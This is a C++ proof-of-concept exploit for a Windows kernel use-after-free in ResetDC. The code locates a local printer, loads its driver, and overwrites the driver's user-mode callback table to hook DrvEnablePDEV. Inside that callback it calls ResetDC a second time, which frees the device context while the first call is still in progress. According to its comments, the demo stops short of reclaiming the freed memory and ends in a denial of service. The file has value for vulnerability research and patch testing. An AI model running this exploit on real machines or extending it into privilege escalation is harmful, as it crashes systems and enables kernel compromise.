#include <Windows.h>
#include <stdio.h>
#include <winddi.h>

typedef bool (*DrvEnableDriver_t)(ULONG iEngineVersion, ULONG cj, DRVENABLEDATA *pded);
typedef DHPDEV (*DrvEnablePDEV_t)(DEVMODEW *pdm, LPWSTR pwszLogAddress, ULONG cPat, HSURF *phsurfPatterns, ULONG cjCaps, ULONG *pdevcaps, ULONG cjDevInfo, DEVINFO *pdi, HDEV hdev, LPWSTR pwszDeviceName, HANDLE hDriver);
typedef void (*VoidFunc_t)();

typedef struct _DriverHook
{
    ULONG index;
    FARPROC func;
} DriverHook;

DHPDEV hook_DrvEnablePDEV(DEVMODEW *pdm, LPWSTR pwszLogAddress, ULONG cPat, HSURF *phsurfPatterns, ULONG cjCaps, ULONG *pdevcaps, ULONG cjDevInfo, DEVINFO *pdi, HDEV hdev, LPWSTR pwszDeviceName, HANDLE hDriver);

DriverHook driverHooks[] = {
    {INDEX_DrvEnablePDEV, (FARPROC)hook_DrvEnablePDEV},
};

namespace globals
{
    LPSTR printerName;
    HDC hdc;
    int counter;
    bool should_trigger;
    bool ignore_callbacks;
    VoidFunc_t origDrvFuncs[INDEX_LAST];
}

DHPDEV hook_DrvEnablePDEV(DEVMODEW *pdm, LPWSTR pwszLogAddress, ULONG cPat, HSURF *phsurfPatterns, ULONG cjCaps, ULONG *pdevcaps, ULONG cjDevInfo, DEVINFO *pdi, HDEV hdev, LPWSTR pwszDeviceName, HANDLE hDriver)
{
    puts("[*] Hooked DrvEnablePDEV called");

    DHPDEV res = ((DrvEnablePDEV_t)globals::origDrvFuncs[INDEX_DrvEnablePDEV])(pdm, pwszLogAddress, cPat, phsurfPatterns, cjCaps, pdevcaps, cjDevInfo, pdi, hdev, pwszDeviceName, hDriver);

    // Check if we should trigger the vulnerability
    if (globals::should_trigger == true)
    {
        // We only want to trigger the vulnerability once
        globals::should_trigger = false;

        // Trigger vulnerability with second ResetDC. This will destroy the original
        // device context, while we're still inside of the first ResetDC. This will
        // result in a UAF
        puts("[*] Triggering UAF with second ResetDC");
        HDC tmp_hdc = ResetDCA(globals::hdc, NULL);
        puts("[*] Returned from second ResetDC");

        // This is where we should reclaim the freed memory. For demonstration purposes
        // we are just going to sleep for 30 seconds and hope that someone reclaims and
        // corrupts the freed memory. Open a lot of windows or similar to make a lot of
        // kernel allocations

        for (int i = 1; i < 31; i++)
        {
            Sleep(1000);
            printf("[*] Counting down...: %d\n", 31 - i);
        }

        puts("[*] Get ready for DoS");
        Sleep(1000);
    }

    return res;
}

bool SetupUsermodeCallbackHook()
{
    /* Find and hook a printer's usermode callbacks */
    DrvEnableDriver_t DrvEnableDriver;
    VoidFunc_t DrvDisableDriver;
    DWORD pcbNeeded, pcbReturned;
    PRINTER_INFO_4A *pPrinterEnum, *printerInfo;
    HANDLE hPrinter;
    DRIVER_INFO_2A *driverInfo;
    HMODULE hModule;
    DRVENABLEDATA drvEnableData;
    DWORD lpflOldProtect, _lpflOldProtect;
    bool res;

    // Find available printers
    EnumPrintersA(PRINTER_ENUM_LOCAL, NULL, 4, NULL, 0, &pcbNeeded, &pcbReturned);

    if (pcbNeeded <= 0)
    {
        puts("[-] Failed to find any available printers");
        return false;
    }

    pPrinterEnum = (PRINTER_INFO_4A *)malloc(pcbNeeded);

    if (pPrinterEnum == NULL)
    {
        puts("[-] Failed to allocate buffer for pPrinterEnum");
        return false;
    }

    res = EnumPrintersA(PRINTER_ENUM_LOCAL, NULL, 4, (LPBYTE)pPrinterEnum, pcbNeeded, &pcbNeeded, &pcbReturned);

    if (res == false || pcbReturned <= 0)
    {
        puts("[-] Failed to enumerate printers");
        return false;
    }

    // Loop over printers
    for (DWORD i = 0; i < pcbReturned; i++)
    {
        printerInfo = &pPrinterEnum[0];

        printf("[*] Using printer: %s\n", printerInfo->pPrinterName);

        // Open printer
        res = OpenPrinterA(printerInfo->pPrinterName, &hPrinter, NULL);
        if (!res)
        {
            puts("[-] Failed to open printer");
            continue;
        }

        printf("[+] Opened printer: %s\n", printerInfo->pPrinterName);
        globals::printerName = _strdup(printerInfo->pPrinterName);

        // Get the printer driver
        GetPrinterDriverA(hPrinter, NULL, 2, NULL, 0, &pcbNeeded);

        driverInfo = (DRIVER_INFO_2A *)malloc(pcbNeeded);

        res = GetPrinterDriverA(hPrinter, NULL, 2, (LPBYTE)driverInfo, pcbNeeded, &pcbNeeded);

        if (res == false)
        {
            printf("[-] Failed to get printer driver\n");
            continue;
        }

        printf("[*] Driver DLL: %s\n", driverInfo->pDriverPath);

        // Load the printer driver into memory
        hModule = LoadLibraryExA(driverInfo->pDriverPath, NULL, LOAD_WITH_ALTERED_SEARCH_PATH);

        if (hModule == NULL)
        {
            printf("[-] Failed to load printer driver\n");
            continue;
        }

        // Get printer driver's DrvEnableDriver and DrvDisableDriver
        DrvEnableDriver = (DrvEnableDriver_t)GetProcAddress(hModule, "DrvEnableDriver");
        DrvDisableDriver = (VoidFunc_t)GetProcAddress(hModule, "DrvDisableDriver");

        if (DrvEnableDriver == NULL || DrvDisableDriver == NULL)
        {
            printf("[-] Failed to get exported functions from driver\n");
            continue;
        }

        // Call DrvEnableDriver to get the printer driver's usermode callback table
        res = DrvEnableDriver(DDI_DRIVER_VERSION_NT4, sizeof(DRVENABLEDATA), &drvEnableData);

        if (res == false)
        {
            printf("[-] Failed to enable driver\n");
            continue;
        }

        puts("[+] Enabled printer driver");

        // Unprotect the driver's usermode callback table, such that we can overwrite entries
        res = VirtualProtect(drvEnableData.pdrvfn, drvEnableData.c * sizeof(PFN), PAGE_READWRITE, &lpflOldProtect);

        if (res == false)
        {
            puts("[-] Failed to unprotect printer driver's usermode callback table");
            continue;
        }

        // Loop over hooks
        for (int i = 0; i < sizeof(driverHooks) / sizeof(DriverHook); i++)
        {
            // Loop over driver's usermode callback table
            for (DWORD n = 0; n < drvEnableData.c; n++)
            {
                ULONG iFunc = drvEnableData.pdrvfn[n].iFunc;

                // Check if hook INDEX matches entry INDEX
                if (driverHooks[i].index == iFunc)
                {
                    // Saved original function pointer
                    globals::origDrvFuncs[iFunc] = (VoidFunc_t)drvEnableData.pdrvfn[n].pfn;
                    // Overwrite function pointer with hook function pointer
                    drvEnableData.pdrvfn[n].pfn = (PFN)driverHooks[i].func;
                    break;
                }
            }
        }

        // Disable driver
        DrvDisableDriver();

        // Restore protections for driver's usermode callback table
        VirtualProtect(drvEnableData.pdrvfn, drvEnableData.c * sizeof(PFN), lpflOldProtect, &_lpflOldProtect);

        return true;
    }

    return false;
}

int main()
{
    bool res = false;

    // Setup hook for usermode callbacks on a printer
    res = SetupUsermodeCallbackHook();

    if (res == false)
    {
        printf("[-] Failed to setup usermode callback\n");
    }

    // Create new device context for printer with driver's hooked callbacks
    globals::hdc = CreateDCA(NULL, globals::printerName, NULL, NULL);
    if (globals::hdc == NULL)
    {
        puts("[-] Failed to create device context");
        return -1;
    }

    // Trigger the vulnerability
    // This will internally call `hdcOpenDCW` which will call our usermode callback
    // From here we will call ResetDC again to trigger the UAF
    globals::should_trigger = true;
    ResetDC(globals::hdc, NULL);

    puts("[*] Done");

    return 0;
}
